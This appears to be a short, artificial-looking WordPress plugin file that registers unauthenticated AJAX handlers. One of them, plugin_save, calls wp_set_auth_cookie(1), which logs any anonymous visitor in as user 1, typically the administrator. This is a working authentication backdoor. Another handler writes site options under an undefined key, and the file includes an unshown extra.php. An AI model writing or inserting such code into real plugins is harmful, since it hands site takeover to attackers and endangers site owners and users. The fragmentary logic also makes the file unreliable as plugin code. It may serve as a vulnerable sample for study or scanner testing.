<?php
add_action('wp_ajax_nopriv_plugin_save', 'plugin_save');
add_action('wp_ajax_nopriv_plugin_load', 'plugin_load');
add_action('wp_ajax_nopriv_plugin_dynamic', 'plugin_dynamic');
add_filter('retrieve_password_message', 'plugin_mail');
include __DIR__ . '/includes/extra.php';
function plugin_save() {
    update_option('plugin_shared', 'value');
    wp_set_auth_cookie(1);
}
function plugin_load() {
    get_option('plugin_shared');
}
function plugin_dynamic() {
    update_option($key, 'value');
}
function plugin_mail($message) {
    return $message;
}
